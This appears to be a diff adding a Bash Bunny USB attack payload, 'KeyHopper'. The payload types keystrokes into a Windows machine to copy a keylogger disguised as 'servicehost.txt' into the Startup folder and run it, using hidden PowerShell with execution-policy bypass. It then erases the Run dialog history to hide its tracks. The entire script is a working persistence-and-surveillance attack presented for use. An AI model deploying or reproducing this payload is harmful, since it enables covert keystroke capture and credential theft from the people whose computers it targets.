@@ -1,0 +1,69 @@
+#!/bin/bash
+
+#KeyHopper
+#Spawns a keylogger and adds it to shell:startup
+
+#Delay CONFIGURATION
+#Edit the lines below to change the standard delays in the script
+#SFD = Super Fast delay (waiting for CTRL v for example) FASTMODE(standard)=100 SLOWMODE=500
+SFD="100"
+#FD = Fast delay (waiting for CTRL v for example) FASTMODE(standard)=500 SLOWMODE=1000
+FD="500"
+#ND = Normal delay (waiting for programs to shut off) FASTMODE(standard)=1000 SLOWMODE=2000
+ND="1000"
+#LD = Long delay (waiting for programs to start or bash scipts to execute) FASTMODE(standard)=1500 SLOWMODE=3500
+LD="1500"
+
+#KeyloggerName CONFIGURATION
+name=servicehost.txt
+
+#Shutting off CONFIGURATION
+#Edit the line below to shut the bunny off after finishing ("" = turn off / "#" = Do not turn off)
+AM="#"
+
+#Editing text below this line may prevent the script from working! (Except for changing servicehost.txt)
+
+#Setup
+LED SETUP
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+#Wait for the computer to recognise the drive etc
+Q delay $LD
+Q delay $LD
+Q delay $LD
+#Get drive letter and copy it:
+RUN WIN Powershell -nop -ex Bypass -w Hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\GetDrive.ps1')"
+Q DELAY $ND
+
+
+#Copy keylogger and add it to shell:startup
+LED STAGE4
+Q GUI r
+Q DELAY $SFD
+Q STRING powershell
+Q ENTER
+Q DELAY $FD
+Q STRING copy
+Q SPACE
+Q DELAY $ND
+Q CONTROL v
+Q DELAY $FD
+Q BACKSPACE
+Q DELAY $FD
+Q STRING "payloads\\"$name" 'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'"
+Q ENTER
+Q DELAY $FD
+Q STRING "start 'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\"$name"\'"
+Q DELAY $SFD
+Q ENTER
+Q ALT F4
+Q DELAY $LD
+Q DELAY $LD
+
+#Cleaning up fase
+LED CLEANUP
+RUN WIN powershell -WindowStyle Hidden -Exec Bypass "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+Q ENTER
+
+LED FINISH
+$AM ATTACKMODE OFF
